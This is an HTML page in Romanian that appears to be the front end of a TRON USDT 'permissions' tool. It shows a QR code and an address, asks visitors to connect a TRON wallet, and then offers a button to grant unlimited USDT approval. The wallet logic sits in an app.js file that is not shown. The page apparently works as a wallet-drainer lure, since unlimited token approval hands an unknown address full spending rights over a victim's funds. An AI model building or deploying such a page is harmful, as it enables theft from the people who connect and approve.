<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Permisiuni USDT TRC-20 - TRON</title>

    <link rel="manifest" href="manifest.json">
    <meta name="theme-color" content="#0f172a">

    <!-- Librărie pentru generarea codului QR -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; padding: 25px; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); text-align: center; }
        
        h2 { margin-top: 0; font-size: 20px; color: #fff; }
        .desc { font-size: 13px; color: #94a3b8; margin-bottom: 20px; }
        
        label { display: block; text-align: left; font-size: 13px; color: #cbd5e1; margin-top: 15px; font-weight: 500; }
        
        #qrcode { display: flex; justify-content: center; margin: 15px 0; background: white; padding: 15px; border-radius: 8px; }
        .tron-address { font-size: 12px; background: #0f172a; padding: 10px; border-radius: 6px; border: 1px dashed #334155; word-break: break-all; margin-top: 10px; color: #38bdf8; }
        
        .main-btn { background-color: #2563eb; color: white; border: none; padding: 14px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; font-size: 16px; transition: background 0.2s; }
        .main-btn:hover { background-color: #1d4ed8; }
        .main-btn:disabled { background-color: #475569; cursor: not-allowed; }

        .status { margin-top: 20px; font-size: 13px; color: #38bdf8; word-break: break-all; padding: 10px; border-radius: 8px; background: rgba(56, 189, 248, 0.1); display: none; }
    </style>
</head>
<body>

<div class="card">
    <h2>Permisiuni USDT TRC-20</h2>
    <div class="desc">Rețeaua TRON (Aprobare Nelimitată)</div>
    
    <label>Scanează codul QR cu telefonul:</label>
    <div id="qrcode"></div>
    
    <div class="tron-address" id="tronAddressText">Se încarcă adresa...</div>
    
    <button id="connectTronBtn" class="main-btn" onclick="connectTronWallet()">Conectează Portofel TRON</button>

    <div id="tronApproveSection" style="display:none; margin-top: 15px;">
        <button id="approveTronBtn" class="main-btn" style="background-color: #16a34a;" onclick="handleTronUnlimitedApprove()">Acordă Approve Nelimitat</button>
    </div>

    <div class="status" id="tronStatusText"></div>
</div>

<script src="app.js"></script>
</body>
</html>
